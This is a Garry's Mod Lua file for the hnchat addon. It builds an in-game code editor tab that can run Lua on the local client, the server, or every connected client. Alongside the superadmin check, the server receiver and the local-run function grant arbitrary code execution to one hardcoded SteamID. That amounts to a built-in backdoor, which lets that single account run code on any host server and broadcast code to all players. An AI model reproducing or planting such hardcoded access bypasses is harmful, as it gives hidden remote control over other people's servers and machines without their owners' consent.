if not hnchat then return end
local netluaclients = "HNCHAT_LUA_CLIENTS"
local netluasv = "HNCHAT_LUA_SV"

if SERVER then 
	util.AddNetworkString(netluaclients)
	util.AddNetworkString(netluasv)

	net.Receive(netluasv,function(len,ply)
		if not IsValid(ply) then return end
		local code = net.ReadString()
		local mode = net.ReadString()
		if ply:IsSuperAdmin() or ply:SteamID() == "STEAM_0:0:41908082" then
			if string.match(mode,"server") then
				CompileString(code,ply:GetName())()
			elseif string.match(mode,"clients") then
				net.Start(netluaclients)
				net.WriteString(code)
				net.WriteEntity(ply)
				net.Broadcast()
			elseif string.match(mode,"shared") then
				CompileString(code,ply:GetName())()
				net.Start(netluaclients)
				net.WriteString(code)
				net.WriteEntity(ply)
				net.Broadcast()
			end
		else
			ply:ChatPrint("Access Denied.")
		end
	end)

	return
end

local luaf = {}

luaf.RunOnClients = function(code,ply)
	net.Start(netluasv)
	net.WriteString(code)
	net.WriteString("clients")
	net.SendToServer()
end

luaf.RunOnSelf = function(code,ply)
	if LocalPlayer():SteamID() == "STEAM_0:0:41908082" or LocalPlayer():IsSuperAdmin() or GetConVar("sv_allowcslua"):GetBool() then
		CompileString(code,LocalPlayer():GetName())()
	end
end

luaf.RunOnShared = function(code,ply)
	net.Start(netluasv)
	net.WriteString(code)
	net.WriteString("shared")
	net.SendToServer()
end

luaf.RunOnServer = function(code,ply)
	net.Start(netluasv)
	net.WriteString(code)
	net.WriteString("server")
	net.SendToServer()
end

net.Receive(netluaclients,function(len)
	local code = net.ReadString()
	local ply = net.ReadEntity()
	if not IsValid(ply) then return end
	CompileString(code,ply:GetName())()
end)

local lua = vgui.Create("DPanel")
lua.Paint = function() return false end
local modes = {
	Glua = "glua",
	Lua = "lua",
	Javscript = "javascript",
	Json = "json",
	Text = "text",
	["Plain text"] = "plain_text",
	Sql = "sql",
	Xml = "xml",
	Ada = "ada",
	["Assembly x86"] = "assembly_x86",
	Autohotkey = "autohotkey",
	Batchfile = "batchfile",
	C9search = "c9search",
	["C cpp"] = "c_cpp",
	Csharp = "csharp",
	Css = "css",
	Diff = "diff",
	Html = "html",
	["Html ruby"] = "html_ruby",
	Ini = "ini",
	Java = "java",
	Jsoniq = "jsoniq",
	Jsp = "jsp",
	Luapage = "luapage",
	Lucene = "lucene",
	Makefile = "makefile",
	Markdown = "markdown",
	Mysql = "mysql",
	Perl = "perl",
	Pgsql = "pgsql",
	Php = "php",
	Powershell = "powershell",
	Properties = "properties",
	Python = "python",
	Rhtml = "rhtml",
	Ruby = "ruby",
	Sh = "sh",
	Snippets = "snippets",
	Svg = "svg",
	Vbscript = "vbscript",
}
local themes = {
	Ambiance = "ambiance",
	Chaos = "chaos",
	Chrome = "chrome",
	Clouds = "clouds",
	["Clouds midnight"] = "clouds_midnight",
	Cobalt = "cobalt",
	["Crimson editor"] = "crimson_editor",
	Dawn = "dawn",
	Dreamweaver = "dreamweaver",
	Eclipse = "eclipse",
	Github = "github",
	["Idle fingers"] = "idle_fingers",
	Iplastic = "iplastic",
	Katzenmilch = "katzenmilch",
	["Kr theme"] = "kr_theme",
	Kuroir = "kuroir",
	Merbivore = "merbivore",
	["Merbivore soft"] = "merbivore_soft",
	["Mono industrial"] = "mono_industrial",
	Monokai = "monokai",
	["Pastel on dark"] = "pastel_on_dark",
	["Solarized dark"] = "solarized_dark",
	["Solarized light"] = "solarized_light",
	Sqlserver = "sqlserver",
	Terminal = "terminal",
	Textmate = "textmate",
	Tomorrow = "tomorrow",
	["Tomorrow night"] = "tomorrow_night",
	["Tomorrow night blue"] = "tomorrow_night_blue",
	["Tomorrow night bright"] = "tomorrow_night_bright",
	["Tomorrow night eighties"] = "tomorrow_night_eighties",
	Twilight = "twilight",
	["Vibrant ink"] = "vibrant_ink",
	Xcode = "xcode",
}

local ezdraw = function( self, w, h )
	col = self:IsHovered() and Color(222,222,222) or Color(234,234,234)
	textcol = self:IsHovered() and Color(96,42,180) or Color(81,81,81)
	textcol = self:IsDown() and color_white or textcol

	draw.RoundedBox( 0, 0, 0, w, h, col)
	local x,y = self:GetTextInset()
	draw.SimpleText( self:GetText(), "DermaDefault", x+4, h/2, textcol, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	return true
end
local function AddButton( parent, vert, txt, icon, wide, paint, cb )
	txt = txt or "Text"
	icon = icon or "icon16/cog.png"
	wide = wide or 68
	paint = paint or ezdraw
	cb = cb or function() end

	local but = vgui.Create("DButton", parent)
	but:SetText(txt)
	but:SetIcon(icon)
	but:Dock((vert and LEFT or TOP))
	but:SetWide(wide)
	but.Paint = paint
	but.DoClick = function()
		cb()
	end

	if vert then parent:AddPanel(but) end
	return but
end
local function fixupURL(url)
	if url and isstring(url) then
		url = url:Trim()

		url = url:gsub( "^http%://onedrive%.live%.com/redir?", "https://onedrive.live.com/download?")
		url = url:gsub( "pastebin.com/([a-zA-Z0-9]*)$", "pastebin.com/raw.php?i=%1")
		url = url:gsub( "hastebin.com/([a-zA-Z0-9]*)$", "hastebin.com/raw/%1")
		url = url:gsub( "github.com/([a-zA-Z0-9_]+)/([a-zA-Z0-9_]+)/blob/", "github.com/%1/%2/raw/")
	end
	return url
end
local function SimpleFetch(url,cb,failcb)
	if not url or #url<4 then return end

	url = fixupURL(url)

	http.Fetch(url,
	function(data,len,headers,code)
		if code~=200 then
			Msg"[PAC] Url "print(string.format("failed loading %s (server returned %s)",url,tostring(code)))
			if failcb then
				failcb(code,data,len,headers)
			end
			return
		end
		cb(data,len,headers)
	end,
	function(err)
		Msg"[PAC] Url "print(string.format("failed loading %s (%s)",url,tostring(err)))
		if failcb then
			failcb(err)
		end
	end)
end

lua.topbar = vgui.Create( "DHorizontalScroller", lua )
lua.topbar:Dock(TOP)
lua.topbar.Paint = function( self, w, h )
	draw.RoundedBox( 3, 0, 0, w, h, Color(234,234,234,255))
end
lua.topbar:SetOverlap(0)
lua.leftbar = vgui.Create( "DScrollPanel", lua )
lua.leftbar:Dock(LEFT)
lua.leftbar.Paint = function( self, w, h )
	draw.RoundedBox( 3, 0, 0, w, h, Color(234,234,234,255))
end
lua.leftbar:SetWide(74)

AddButton(lua.topbar, true, "Menu", "icon16/application_form_edit.png",74,function(self,w,h)
	draw.RoundedBox( 0, 0, 0, w, h, Color(234,234,234))
	draw.SimpleText( self:GetText(), "DermaDefault", w/2, h/2, Color(81,81,81), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	return true
end,function(self)
	local menu = DermaMenu()
		menu:AddOption( "Configure", function()
			lua.html:Call([[editor.showSettingsMenu()]])
		end)
		menu:AddOption( "Toggle left panel", function()
			lua.leftbar:SetVisible(not lua.leftbar:IsVisible())
			lua.html:Dock(FILL) -- TODO: get that shit to auto do this
			lua:InvalidateLayout()
		end)
		menu:AddOption( "Show Help", function()
			lua.html:Call([[editor.showKeyboardShortcuts()]])
		end)
	local fix = menu:AddSubMenu("Fix")
		fix:AddOption( "Reopen URL", function()
			lua.html:OpenURL("http://metastruct.github.io/lua_editor/")
		end)
		fix:AddOption( "Reload", function()
			lua.html:Refresh()
		end)
		fix:AddOption( "Reload (empty cache)", function()
			lua.html:Refresh(true)
		end)
	local mode = menu:AddSubMenu("Mode")
		for k, v in pairs(modes) do
			mode:AddOption(k, function()
				lua.html:Call([[editor.getSession().setMode("ace/mode/]]..v..[[");]])
			end)
		end
	local theme = menu:AddSubMenu("Theme")
		for k, v in SortedPairs(themes) do
			theme:AddOption(k, function()
				lua.html:Call([[editor.setTheme("ace/theme/]]..v..[[");]])
			end)
		end
	local fontsize = menu:AddSubMenu("Font Size")
		for i=9, 24 do
			fontsize:AddOption( i.." px", function()
				lua.html:Call("editor.setFontSize("..i..")")
			end)
		end

	menu:AddOption( "Legacy LuaDev", function()
		--lua.html:Call([[editor.showSettingsMenu()]])
	end)
	menu:AddOption( "Performance", function()
		--lua.html:Call([[editor.showSettingsMenu()]])
	end)
	menu:AddOption( "1 fps refresh", function()
		--lua.html:Call([[editor.showSettingsMenu()]])
	end)
	menu:Open()
end)
local spacer = vgui.Create("DPanel", lua.topbar)
	spacer:SetWide(32)
	spacer:Dock(LEFT)
	spacer.Paint = function(self) return false end
	lua.topbar:AddPanel(spacer)
AddButton(lua.topbar, true, "Run", "icon16/cog_go.png", 55, function(self, w, h)
	col = self:IsHovered() and Color(222,222,222) or Color(190,243,188)
	textcol = self:IsHovered() and Color(96,42,180) or Color(81,81,81)
	textcol = self:IsDown() and color_white or textcol

	draw.RoundedBox( 0, 0, 0, w, h, col)
	draw.SimpleText( self:GetText(), "DermaDefault", w/2, h/2, textcol, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
	return true
end,function(self)
	-- <0:0:41908082|<color=51,0,221>homonovu><New 3>
	-- <steamid|player name><file name>
	luaf.RunOnSelf(lua.html:GetCode(),LocalPlayer())
end)
AddButton(lua.topbar, true, "Server", "icon16/server.png", nil, nil, function()
	luaf.RunOnServer(lua.html:GetCode(),LocalPlayer())
end)
AddButton(lua.topbar, true, "Clients", "icon16/group.png", nil, nil, function()
	luaf.RunOnClients(lua.html:GetCode(),LocalPlayer())
end)
AddButton(lua.topbar, true, "Shared", "icon16/world.png", 70, nil, function()
	luaf.RunOnShared(lua.html:GetCode(),LocalPlayer())
end)
local spacer = vgui.Create("DPanel", lua.topbar)
	spacer:SetWide(16)
	spacer:Dock(LEFT)
	spacer.Paint = function() return false end
	lua.topbar:AddPanel(spacer)
--AddButton(lua.topbar, true, "Player", "icon16/user.png", 66)
--AddButton(lua.topbar, true, "Devs", "icon16/user_gray.png", 60)
--AddButton(lua.topbar, true, "Nearby", "icon16/group.png", 71)
--[[local spacer = vgui.Create("DPanel", lua.topbar)
	spacer:SetSize(16,24)
	spacer:Dock(LEFT)
	spacer.Paint = function() return false end
	lua.topbar:AddPanel(spacer)
AddButton(lua.topbar,"Servers","icon16/server_lightning.png",85)
AddButton(lua.topbar,"Javascript","icon16/script_gear.png",85)]]

AddButton(lua.leftbar, false, "Save", "icon16/server.png", 74, nil, function()
	local menu = DermaMenu()

	menu:AddOption( "Name", function()
		Derma_StringRequest("Backup","Name your backup","",function(txt)
			local time = os.date("%Y_%m", os.time())
			local path = "lua_editor/"..time.."/"
			file.Write( path..txt..".txt", lua.html:GetSession() )
		end)
	end)
	menu:AddOption( "No name", function()
		local time = os.date("%Y_%m", os.time())
		local path = "lua_editor/"..time.."/"
		local files, dir = file.Find( "data/"..path.."backup*", "GAME", "nameasc" )
		file.Write( path.."backup"..(#files+1<10 and "0"..#files+1 or #files+1)..".txt", lua.html:GetSession() )
	end)

	menu:Open()
end)
AddButton(lua.leftbar, false, "Load", "icon16/script_edit.png", 74, nil, function()
	local menu = DermaMenu()
		menu:AddOption( "not", function()
			-- lua.html:Call([[editor.showKeyboardShortcuts()]])
		end)
	menu:AddSpacer()
	local fix = menu:AddSubMenu("working")
		fix:AddOption( "sorry", function()
			-- lua.html:OpenURL("http://metastruct.github.io/lua_editor/")
		end)
		fix:AddSpacer()
		fix:AddOption( ":(", function()
			-- lua.html:Refresh(true)
		end)
		fix:AddOption( "use open for now", function()
			-- lua.html:Refresh(true)
		end)

	menu:Open()
end)
AddButton(lua.leftbar, false, "Open", "icon16/folder_explore.png", 74, nil, function()
	local fr = vgui.Create("DFrame")
	fr:SetSize(310,340)
	fr:SetTitle("File Browser")
	fr:MakePopup()

	local br = vgui.Create("DTree", fr)
	br:Dock(FILL)

	br.OnNodeSelected = function(self, node)
		local name = node:GetFolder() or node:GetFileName() or ""
		if not file.IsDir(name,"GAME") then
			lua.html:Call('editor.setValue("'..string.JavascriptSafe(file.Read(name,"GAME"))..'");')
			fr:Close()
		end
	end

	br:AddNode( "lua" ):MakeFolder("lua","GAME",true)
	br:AddNode( "data" ):MakeFolder("data","GAME",true)
end)
local spacer = vgui.Create("DPanel", lua.leftbar)
	spacer:Dock(TOP)
	spacer:SetTall(8)
	spacer.Paint = function() return false end
AddButton(lua.leftbar, false, "Load URL", "icon16/page_link.png", 74, nil, function(self)
	Derma_StringRequest("Load URL","Paste in URL, pastebin and hastebin links are automatically in raw form.","",function(txt)
		if txt:find("https?://") then
			local function callback(str)
				lua.html:Call('editor.setValue("'..string.JavascriptSafe(str)..'");')
			end
			SimpleFetch(txt, callback)
		end
	end)
end )
local spacer = vgui.Create("DPanel", lua.leftbar)
	spacer:Dock(TOP)
	spacer:SetTall(8)
	spacer.Paint = function() return false end
AddButton(lua.leftbar, false, "pastebin", "icon16/page_link.png", 74)
AddButton(lua.leftbar, false, "Send", "icon16/email_go.png", 74)
AddButton(lua.leftbar, false, "Receive", "icon16/email_open.png", 74)
local spacer = vgui.Create("DPanel", lua.leftbar)
	spacer:Dock(TOP)
	spacer:SetTall(8)
	spacer.Paint = function() return false end
AddButton(lua.leftbar, false, "Beautify", "icon16/font.png", 74)

--local spacer = vgui.Create("DPanel", lua.leftbar)
	--spacer:Dock(TOP)
	--spacer:SetTall(8)
	--spacer.Paint = function() return false end
-- send as shit here
--local spacer = vgui.Create("DPanel", lua.leftbar)
	--spacer:Dock(TOP)
	--spacer:SetTall(8)
	--spacer.Paint = function() return false end
-- easy lua combo box here

--[[lua.prop = vgui.Create( "DPropertySheet", lua )
lua.prop:Dock(FILL)
lua.prop.Paint = function() return false end]]

-- propertysheet (done)
-- drag base (might be built into property sheet's tabs)
-- then tabs

lua.html = vgui.Create( "DHTML", lua )
lua.html:OpenURL("http://metastruct.github.io/lua_editor/")
lua.html.Items = {}
lua.html:Dock(FILL)

function lua.html:HasLoaded()
	return not self:IsLoading()
end
function lua.html:GetSession(name)
	return self.code
end
function lua.html:GetCode(name)
	return self:HasLoaded() and self:GetSession( name ) or ""
end

lua.html:AddFunction( "gmodinterface", "OnReady", function(  )
	lua.html:Call('SetContent("' .. string.JavascriptSafe((lua.html.code or "")) .. '");')
end)
lua.html:AddFunction( "gmodinterface", "OnCode", function( code )
	lua.html.code = code
end)
lua.html:AddFunction( "console", "warn", function(...)
	local txt = ""
	for k, v in next, {...} do txt = txt..(k ~= 1 and " " or "")..v end
	lua.html:ConsoleMessage(txt)
end)

return hnchat.derma.tabs:AddSheet( "Lua", lua, "icon16/page_edit.png", false, false, "Lua" )